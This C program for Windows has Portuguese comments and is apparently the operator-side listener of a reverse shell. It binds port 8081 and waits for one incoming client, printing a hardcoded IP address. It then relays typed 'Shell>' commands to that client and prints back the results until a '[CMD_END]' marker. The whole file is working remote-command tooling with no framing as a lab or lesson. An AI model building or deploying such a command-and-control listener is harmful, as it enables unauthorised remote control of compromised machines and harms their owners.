#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>

#pragma comment(lib, "ws2_32.lib")

#define PORT 8081
#define BUFFER_SIZE 4096

int main() {
    WSADATA wsa;
    SOCKET server_socket, client_socket;
    struct sockaddr_in server, client;
    int client_len = sizeof(client);
    char command[BUFFER_SIZE];
    char response[BUFFER_SIZE];

    // Inicializa Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("[!] Erro ao iniciar Winsock\n");
        return 1;
    }

    // Cria o socket
    server_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (server_socket == INVALID_SOCKET) {
        printf("[!] Erro ao criar socket\n");
        WSACleanup();
        return 1;
    }

    // Configura o servidor
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY; // Aceita conexões de qualquer IP
    server.sin_port = htons(PORT);

    // Vincula o socket à porta
    if (bind(server_socket, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
        printf("[!] Erro ao vincular porta %d\n", PORT);
        closesocket(server_socket);
        WSACleanup();
        return 1;
    }

    // Escuta por conexões
    listen(server_socket, 1);
    printf("[*] Servidor rodando em %s:%d\n", "172.26.122.204", PORT);
    printf("[*] Aguardando conexao...\n");

    // Aceita a conexão do cliente
    client_socket = accept(server_socket, (struct sockaddr*)&client, &client_len);
    if (client_socket == INVALID_SOCKET) {
        printf("[!] Erro ao aceitar conexao\n");
        closesocket(server_socket);
        WSACleanup();
        return 1;
    }

    printf("[+] Cliente conectado: %s\n", inet_ntoa(client.sin_addr));
    printf("[*] Digite 'exit' para sair\n");

    while (1) {
        printf("Shell> ");
        fgets(command, sizeof(command), stdin);
        command[strcspn(command, "\n")] = '\0'; // Remove o '\n'

        if (strcmp(command, "exit") == 0) break;

        // Envia o comando para o cliente
        if (send(client_socket, command, strlen(command), 0) <= 0) {
            printf("[!] Erro ao enviar comando\n");
            break;
        }

        // Recebe a resposta do cliente
        int bytes_received;
        while ((bytes_received = recv(client_socket, response, BUFFER_SIZE - 1, 0)) > 0) {
            response[bytes_received] = '\0';
            printf("%s", response);
            if (strstr(response, "[CMD_END]")) break;
        }

        if (bytes_received <= 0) {
            printf("[!] Conexao perdida\n");
            break;
        }
    }

    closesocket(client_socket);
    closesocket(server_socket);
    WSACleanup();
    return 0;
}